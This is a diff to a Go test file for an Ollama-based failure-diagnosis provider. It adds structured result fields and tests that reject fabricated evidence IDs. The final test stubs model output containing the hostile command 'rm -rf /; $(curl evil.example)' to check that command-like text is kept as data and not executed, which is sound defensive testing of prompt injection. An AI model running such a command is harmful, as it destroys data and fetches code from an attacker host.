@@ -29,7 +29,7 @@ func newSuccessStub() *stubOllama {
 			Done: true,
 			Message: ollamaMessage{
 				Role:    "assistant",
-				Content: `{"summary":"Likely duplicate delivery caused the failed idempotency invariant.","suggestions":["Add idempotency keys","Enforce unique constraints"]}`,
+				Content: `{"summary":"Likely duplicate delivery caused the failed idempotency invariant.","probable_causes":["missing idempotency key","retry without dedup"],"cited_evidence_ids":["attempt-2","attempt-3"],"suggested_follow_up_scenarios":["Add idempotency keys","Enforce unique constraints"],"confidence_rationale":"two attempts with same event id and no dedup"}`,
 			},
 		}
 		w.Header().Set("Content-Type", "application/json")
@@ -91,8 +91,17 @@ func TestOllamaSuccessfulDiagnosis(t *testing.T) {
 	if res.Model == nil || *res.Model != "test-model" {
 		t.Fatalf("expected model test-model, got %v", res.Model)
 	}
-	if len(res.Suggestions) != 2 {
-		t.Fatalf("expected 2 suggestions, got %d", len(res.Suggestions))
+	if len(res.SuggestedFollowUpScenarios) != 2 {
+		t.Fatalf("expected 2 follow-up scenarios, got %d", len(res.SuggestedFollowUpScenarios))
+	}
+	if res.ProbableCauses == nil || len(res.ProbableCauses) == 0 {
+		t.Fatal("expected probable causes")
+	}
+	if res.CitedEvidenceIDs == nil || len(res.CitedEvidenceIDs) == 0 {
+		t.Fatal("expected cited evidence ids")
+	}
+	if res.ConfidenceRationale == nil || *res.ConfidenceRationale == "" {
+		t.Fatal("expected confidence rationale")
 	}
 }
 
@@ -208,3 +217,79 @@ func TestMarshalInputProducesJSON(t *testing.T) {
 		t.Fatal("expected run_id in marshalled input")
 	}
 }
+
+func TestResultValidateAcceptsKnownEvidenceIDs(t *testing.T) {
+	r := &Result{
+		Summary:          strPtr("hypothesis"),
+		CitedEvidenceIDs: []string{"attempt-2", "attempt-3"},
+	}
+	if err := r.Validate([]string{"attempt-1", "attempt-2", "attempt-3"}); err != nil {
+		t.Fatalf("expected valid, got %v", err)
+	}
+}
+
+func TestResultValidateRejectsUnknownEvidenceIDs(t *testing.T) {
+	r := &Result{
+		Summary:          strPtr("hypothesis"),
+		CitedEvidenceIDs: []string{"attempt-2", "fabricated-99"},
+	}
+	if err := r.Validate([]string{"attempt-1", "attempt-2", "attempt-3"}); err == nil {
+		t.Fatal("expected error for fabricated evidence id")
+	}
+}
+
+func TestResultValidateRejectsEmptyCitedID(t *testing.T) {
+	r := &Result{
+		Summary:          strPtr("hypothesis"),
+		CitedEvidenceIDs: []string{"attempt-2", ""},
+	}
+	if err := r.Validate([]string{"attempt-2"}); err == nil {
+		t.Fatal("expected error for empty cited evidence id")
+	}
+}
+
+func TestResultValidateNilResult(t *testing.T) {
+	var r *Result
+	if err := r.Validate([]string{"attempt-2"}); err == nil {
+		t.Fatal("expected error for nil result")
+	}
+}
+
+func TestResultValidateNoCitedIDsIsValid(t *testing.T) {
+	r := &Result{Summary: strPtr("hypothesis")}
+	if err := r.Validate([]string{"attempt-2"}); err != nil {
+		t.Fatalf("expected valid with no cited ids, got %v", err)
+	}
+}
+
+// TestPromptInjectionTreatedAsUntrustedInput ensures model output containing
+// shell-like or command-like text is treated as data only: it is parsed into
+// struct fields and never executed or acted on.
+func TestPromptInjectionTreatedAsUntrustedInput(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		resp := ollamaChatResponse{
+			Done: true,
+			Message: ollamaMessage{
+				Role:    "assistant",
+				Content: `{"summary":"rm -rf /; $(curl evil.example)","probable_causes":[],"cited_evidence_ids":[]}`,
+			},
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_ = json.NewEncoder(w).Encode(resp)
+	}))
+	defer srv.Close()
+
+	p := NewOllamaProvider(srv.URL, "test-model", 10*time.Second)
+	res, err := p.Diagnose(context.Background(), Input{RunID: "run-1"})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if res == nil {
+		t.Fatal("expected non-nil result")
+	}
+	if res.Summary == nil || *res.Summary != "rm -rf /; $(curl evil.example)" {
+		t.Fatalf("expected command-like text to be stored as data, not executed: %v", res.Summary)
+	}
+}
+
+func strPtr(s string) *string { return &s }
